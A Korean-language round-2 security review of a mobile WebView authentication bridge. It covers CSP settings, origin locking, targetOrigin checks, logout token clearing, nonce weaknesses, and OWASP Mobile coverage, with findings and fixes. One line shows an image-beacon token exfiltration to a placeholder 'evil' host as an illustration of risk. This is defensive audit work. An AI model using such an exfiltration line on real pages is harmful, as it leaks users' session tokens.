   - `connect-src 'self' ${NEXT_PUBLIC_SUPABASE_URL}`(`proxy.ts:37`): supabase 만 추가 — 적절히 좁다. 단 env 미설정 시 `'self'` 만 남아 supabase 호출 차단 가능(기능 이슈, 보안 무관).
   - `img-src 'self' data: blob: https:`(`proxy.ts:36`): `https:` 와일드카드는 이미지 기반 exfil(픽셀 비콘에 토큰을 query 로 실어 전송) 표면을 다소 넓힌다 — same-page 공격자가 nonce/토큰을 `new Image().src="https://evil/?t=..."` 로 유출 가능. 다만 same-page 공격자는 이미 `fetch`(connect-src)·쿠키 직접 접근이 가능하므로 img-src 가 *추가로* 여는 위험은 한계적이다(LOW).
   - dev 분기 `'unsafe-eval' 'unsafe-inline'`(`proxy.ts:28-30`): `process.env.NODE_ENV !== "production"` 로 prod-gate 됨 — **올바르게 게이트되어 있다.** prod 빌드에서는 적용되지 않는다.

### origin lock 완전성 (C-2) — 플랫폼 정밀 평가

- **코드 레벨:** `decideWebViewLoad`(`auth-bridge-core.ts:187-202`)는 비신뢰 top-level http(s) origin 을 `deny`(외부 브라우저 위임)하고, OAuth authorize 는 우선 인터셉트하며, 신뢰 origin/프레임워크 내부(about:blank 등)는 허용한다 — 로직 건전. `originWhitelist=[TRUSTED_ORIGIN]` 이중 방어(`WebViewShell.tsx:85`). 보안 테스트가 evil origin·포트/scheme 불일치·OAuth 우선순위를 모두 검증(`auth-bridge-core.security.test.ts:42-90`).
- **플랫폼 한계 (재확인 — react-native-webview 공식 Reference):** "On Android, `onShouldStartLoadWithRequest` **is not called on the first load**." 즉 cold-start 에서 WebView 가 처음 로드하는 URL(=`sourceUri`=`WEB_URL`, 신뢰 origin)에는 게이트가 안 걸린다 — 그러나 첫 로드 대상이 신뢰 `WEB_URL` 자신이므로 *첫 로드 한정으로는* 실질 위험이 없다. 위험은 첫 로드 *이후*의 네비게이션/리다이렉트이며 그건 게이트가 호출된다. `originWhitelist` 가 first-load 도 포함해 보강하므로(Android `originWhitelist` 도 매칭 시 OS 위임) 이중 방어가 부분적으로 메운다. 그럼에도 **OAuth 리다이렉트 체인 중 Android 일부 리다이렉트가 게이트를 우회할 수 있다는 round-1 우려는 디바이스 실측으로만 최종 확인 가능**하다 → C-2 의 PARTIAL 사유. (R-V3 수동 검증 + 신규 디바이스 항목으로 추적.)
- **TOCTOU 안전성:** 주입 JS 가 in-page 에서 `window.location.origin === ${origin}` 을 LIVE 재검증한 뒤에만 `postMessage` 한다(`useAuthBridge.ts:99`). 이것은 **주입 순간 실제 페이지 origin** 을 검사하므로 stale `currentUrlRef` 의존을 제거한다 — round-1 의 TOCTOU 윈도우(C-2(c))는 **닫혔다.** native 측 `isTrustedOrigin(currentUrl)` 선검사(`useAuthBridge.ts:205,237`)는 1차 게이트이고, in-page LIVE 가드가 2차 결정타다. 적절.

### targetOrigin (H-1) — 확인

- 네이티브→웹: `postMessageJs` 가 `window.postMessage(payload, ${origin})` 에서 `origin`=신뢰 origin literal(`useAuthBridge.ts:99`). cold-start/resume 양쪽 동일 경로(`:224,:242`). `"*"` 없음(grep 확인).
- 웹→네이티브: `ReactNativeWebView.postMessage(serialized)`(`bridge-client.ts:69`) — RN 브리지는 단일 네이티브 수신자라 targetOrigin 개념이 없다(웹 message 이벤트 브로드캐스트 아님). 적절.
- resume 경로도 `injectRevalidate → postMessageJs`(`:242`)로 동일하게 specific origin. **H-1 전 경로 CLOSED.**

### session:none / logout (H-2 / M-3) — 확인

- `session:none → clearTokens`: `decideInboundAction`(`bridge-protocol.ts(mobile):231-233`) + `onMessage` 의 `clear` 액션(`useAuthBridge.ts:183-185`). **CLOSED.**
- 로그아웃 멱등성: `/me` 로그아웃은 `<form action={signOutAction}>`(`me/page.tsx:66`) server action → server redirect `/login` → `LogoutBridgeNotifier` mount → `notifyNativeSessionCleared` 1회 emit(`login/page.tsx:26`, `bridge-client.ts:178-184`). dropped emit 시 백업: 다음 cold-start 에서 웹이 무효 세션을 `session:none` 으로 회신 → `clear`(멱등 재clear). **stale refresh 잔존 윈도우:** cold-start 와 cold-start 사이(앱이 꺼진 동안)에는 SecureStore 에 stale refresh 가 물리적으로 남을 수 있으나(emit 유실 + 앱 미실행), 그 토큰은 (a) 디바이스 키체인 암호화(`WHEN_UNLOCKED_THIS_DEVICE_ONLY`) 하에 있고, (b) 다음 cold-start 에서 즉시 clear 되며, (c) supabase rotation(`config.toml:177`)으로 재사용이 추가 제한된다. **수용 가능한 잔여 — CLOSED.** 단, 로그아웃이 access 토큰 서버 revoke 까지는 안 하므로(refresh rotation 만), 탈취된 *access* 토큰은 만료(최대 1시간, L-1)까지 유효 — 이는 L-1 과 연계된 기존 수용 위험.

### 수정이 도입한 새 약점 검토

- **nonce 폴백 `Math.random`(`nonce-core.ts:39-43`):** WebCrypto 부재 시에만 사용. RN(Hermes)·node(vitest) 모두 WebCrypto 제공이 표준이므로 실 디바이스에서 폴백 경로는 사실상 도달하지 않는다. `Math.random` 은 CSPRNG 가 아니라 예측 가능성이 있으나, **위협 모델상 공격자는 네이티브 메모리/주입 JS 를 관측할 수 없고**, nonce 는 same-page 공격자에겐 어차피 평문 노출(위 평가)이므로 폴백의 약한 엔트로피가 *추가로* 여는 실질 위험은 제한적이다. 그럼에도 "보안 nonce 의 폴백이 비-CSPRNG" 는 원칙적 약점 → LOW(N-2)로 기록. 권장: 폴백을 제거하고 WebCrypto 부재 시 throw(브리지 비활성)하거나, expo-crypto 사용.
- **constantTimeEquals 길이 누출(`bridge-protocol.ts:192-201`):** 길이 다르면 즉시 false 반환 → nonce *길이* 는 타이밍으로 누출된다. 그러나 nonce 길이는 고정(32 hex)이고 비밀이 아니므로 실질 무해. 같은 길이일 때는 XOR 누적 후 단일 반환으로 값 누출 없음 — **올바른 구현.** (이론적 완벽주의라면 길이 비교도 상수시간화 가능하나 불필요.)
- **토큰 로깅:** `console.*` grep 결과 브리지/토큰 모듈에 **0건**. catch 분기도 토큰/에러 내용 비노출(`token-store.ts:46-48,67-68`, `bridge-client.ts:111-116`). 신규 코드에서 토큰 노출 경로 없음. **양호.**
- **`Linking.openURL(denied URL)`(`useAuthBridge.ts:151`):** 비신뢰 top-level origin 을 외부 브라우저로 위임한다. WebView 내 악성 페이지가 임의 URL 로 top-level 네비게이트를 시도하면 그 URL 이 외부 브라우저로 열린다 — 이론적으로 *피싱/open-redirect* 보조 벡터(사용자를 외부 악성 페이지로 유도). 그러나 (a) WebView 는 신뢰 origin 에 잠겨 있어 그런 네비게이션을 *유발*하려면 이미 신뢰 origin XSS 가 필요하고, (b) 외부 브라우저로 여는 것은 *토큰을 동반하지 않으며*(토큰 주입은 in-page LIVE origin 가드로 차단), (c) 사용자에게 외부 브라우저 전환이 가시적이다. **실질 위험 낮음 — LOW(N-4)로 기록.** 권장(선택): `deny` 시 외부 위임 대신 무시(아무 동작 안 함)도 고려 — 위임이 UX 상 꼭 필요한 케이스가 없다면.
- **메시지 replay:** nonce 는 per-session 고정(회전 없음)이라 *같은 세션 내* replay 는 nonce 검증을 통과한다. 그러나 (a) same-page 공격자만 유효 nonce 메시지를 만들 수 있고(위 평가), (b) 브리지 메시지는 멱등(setSession/clear 반복은 무해)이라 replay 의 추가 피해가 없다. **수용 가능.** per-message 회전/단조 카운터는 과설계 — 불필요.

### 신규 발견 (round 2)

| ID | 심각도 | 발견 | 위치 | 권장 |
|---|---|---|---|---|
| **N-1** | MEDIUM | Next.js CSP nonce 자동 적용 미작동 — 요청 헤더에 `Content-Security-Policy` 미설정(`x-nonce` 만 전파), `'strict-dynamic'` 누락, dynamic-render 미강제. prod 에서 hydration 스크립트 차단 또는 nonce 보호 무력화 위험. CSP 보강 레이어(OD-11)가 사실상 비신뢰. | `proxy.ts:26-52`, `middleware.ts:33-38` | Next 공식 패턴대로 `requestHeaders.set('Content-Security-Policy', csp)` 추가 + `'strict-dynamic'` 포함 + nonce 사용 페이지 dynamic 강제. C-1 핵심 방어와 독립이므로 차단은 아님(Run 직후 정리 권장). |
| **N-2** | LOW | nonce 폴백이 비-CSPRNG(`Math.random`). 실 디바이스 도달 가능성 낮으나 보안 nonce 의 폴백으로 부적절. | `nonce-core.ts:39-43` | WebCrypto 부재 시 throw 또는 `expo-crypto` 사용. |
| **N-3** | LOW (PARTIAL of C-2) | Android `onShouldStartLoadWithRequest` first-load 미호출 — `originWhitelist` 가 보강하나 OAuth 리다이렉트 체인 일부 우회는 디바이스 실측 필요. | `useAuthBridge.ts:135-156` (플랫폼) | R-V3 수동 검증에 Android 비신뢰 리다이렉트 실측 추가(디바이스 항목). |
| **N-4** | LOW | `Linking.openURL(denied URL)` 이 외부 브라우저 피싱/open-redirect 보조 벡터(토큰 미동반·신뢰 origin XSS 선행 필요라 실질 낮음). | `useAuthBridge.ts:151` | (선택) deny 시 외부 위임 대신 no-op 고려. |
| **M-2** | MEDIUM (round-1 유지) | prod HTTPS scheme 가드 미구현(env 의존). SPEC 이 follow-up 으로 명시. | `web-url.ts:23-34` | `__DEV__===false` 시 `https:` 강제(localhost 예외). |
| **L-1/L-2** | LOW (round-1 유지) | jwt_expiry 3600; 브리지 스키마/`constantTimeEquals` 중복(계약 테스트 부재). | `config.toml:171`; `bridge-protocol.ts`(mobile/web) | 단축 검토; 공유 패키지/계약 테스트. |

### 업데이트된 OWASP Mobile Top 10 (2024) 커버리지

| ID | 항목 | round-1 | round-2 | 변경 사유 |
|---|---|---|---|---|
| M1 | Improper Credential Usage | 부분 | **통과** | H-2 종단(none→clear 멱등 + rotation) — stale 잔존 수용 범위로 축소. |
| M2 | Inadequate Supply Chain | 미충분 | **부분 통과** | nonce+CSP 로 서드파티 스크립트 표면 축소(단 N-1 로 CSP 레이어 신뢰 저하), L-2 계약 테스트 잔존. |
| M3 | Insecure Authn/Authz | FAIL | **통과** | C-1 세션 고정 차단(origin+nonce 인증), H-2 세션 종료 신뢰화. |
| M4 | Insufficient Input/Output Validation | FAIL | **통과** | C-1 인바운드 origin+nonce 인증(`verifyInboundMessage`) — 스키마+발신자 검증. |
| M5 | Insecure Communication | FAIL | **부분 통과** | C-2 origin 잠금 + H-1 specific targetOrigin CLOSED. 잔여: M-2 HTTPS 가드, N-3 Android first-load 실측. |
| M6 | Inadequate Privacy Controls | 통과 | **통과** | PII 최소화 유지(access/refresh only, userId 미전달). |
| M7 | Insufficient Binary Protections | N/A | N/A | 범위 외. |
| M8 | Security Misconfiguration | FAIL | **통과** | `originWhitelist` 명시 + `setSupportMultipleWindows={false}` + dev CSP prod-gate. (N-1 은 CSP 효능 이슈로 M2/M3 가 아닌 보강 결함.) |
| M9 | Insecure Data Storage | 부분 | **통과** | M-1 `WHEN_UNLOCKED_THIS_DEVICE_ONLY` 명시, M-3 none→clear. |
| M10 | Insufficient Cryptography | 통과 | **부분 통과** | nonce CSPRNG(주경로) 양호, N-2 `Math.random` 폴백만 LOW. |

### Run 완료 수용성 결론

- **C-1 적절히 완화? 예.** 웹 인바운드 메시지가 `event.origin` + per-session nonce 로 인증되고(`verifyInboundMessage`), 네이티브도 대칭 검증한다. 잔여 same-page XSS/공급망 위험은 nonce 가 원리적으로 닫을 수 없는 표면이며, origin-lock+CSP 로 표면이 축소되고 OD-11 에 문서화되어 있다.
- **C-2 적절히 완화? 예 (디바이스 단서 부).** `originWhitelist` + `onShouldStartLoadWithRequest` deny + in-page LIVE origin 재검증(TOCTOU 차단) + specific targetOrigin 의 다층 방어. Android first-load 미호출 한계는 `originWhitelist` 가 보강하나 OAuth 리다이렉트 체인은 **R-V3 디바이스 수동 검증으로 확정** 필요(N-3).
- **브리지가 Run 완료에 수용 가능한가? 예 — PASS-WITH-FIXES.** round-1 의 모든 CRITICAL/HIGH 가 닫혔고 새 차단 결함은 없다. 다음을 동반 권장:
  - (Run 내 또는 직후) **N-1 CSP nonce 구현 정정** — 현재 CSP 보강 레이어가 신뢰 불가, prod hydration 깨질 위험.
  - (디바이스 수동) **R-V3 + N-3** — Android OAuth 리다이렉트가 신뢰 origin 을 벗어나는지, 비신뢰 page 가 in-WebView 로드되는지 실측. (a) 유효 세션 cold-start, (b) 만료 resume, (c) 로그아웃 후 SecureStore clear, (d) evil origin 네비게이션 거부.
  - (follow-up) M-2 prod HTTPS 가드, N-2 nonce 폴백, L-1/L-2.

### 재검증(추가 수정 시)

- N-1 정정 후: 빌드 후 응답에서 `Content-Security-Policy` 가 nonce 를 담고, Next.js hydration 스크립트가 그 nonce 를 부여받는지(브라우저 콘솔 CSP violation 0) 확인.
- 보안 회귀 테스트(이미 존재): `auth-bridge-core.security.test.ts`(verifyNonce/decideWebViewLoad/buildTargetOrigin), `bridge-protocol.security.test.ts`(nonce envelope/위조 거부/none→clear). 웹 측 `verifyInboundMessage`/`parseInboundMessage` 단위 테스트 추가 권장(현재 mobile 측만 보안 테스트 존재 — L-2 연계).

---

Re-reviewed: 2026-06-09 · expert-security (round 2) · REVIEW ONLY (no source modified)
